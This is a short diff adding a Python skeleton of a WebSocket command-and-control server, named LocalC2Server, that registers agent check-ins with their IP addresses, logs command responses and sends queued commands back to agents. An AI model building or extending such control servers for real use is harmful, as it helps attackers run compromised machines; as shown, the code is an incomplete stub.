@@ -1,0 +1,21 @@
+# Using local WebSocket server
+import asyncio
+import websockets
+import json
+
+class LocalC2Server:
+    async def handler(self, websocket, path):
+        async for message in websocket:
+            data = json.loads(message)
+            
+            if data['type'] == 'checkin':
+                # Store in local SQLite
+                self.db.store_agent(data['agent_id'], data['ip'])
+            
+            elif data['type'] == 'command_response':
+                # Log response locally
+                self.log_command(data)
+            
+            # Send new commands from local queue
+            commands = self.db.get_commands(data['agent_id'])
+            await websocket.send(json.dumps(commands))
